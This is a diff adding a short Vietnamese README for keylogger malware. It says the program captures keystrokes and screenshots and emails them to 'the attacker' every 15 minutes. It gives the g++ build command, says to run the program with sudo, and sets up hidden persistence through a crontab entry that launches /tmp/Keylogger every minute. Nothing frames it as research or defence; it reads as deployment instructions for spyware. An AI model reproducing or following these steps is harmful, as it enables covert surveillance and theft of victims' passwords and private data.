@@ -1,0 +1,14 @@
+Keylogger co chuc nang ghi keybroad va chup anh man hinh.
+Moi 15 phut se gui email cho attacker
+
+- Build bang C++
+
+	g++ -pthread Keylogger.cpp -o Keylogger
+
+- De chay duoc phai run bang sudo:
+
+	sudo ./Keylogger
+
+- De Keylogger khoi dong cung he thong: Dat lenh crontab
+
+	crontab -e sau do them vao: * * * * * /tmp/Keylogger
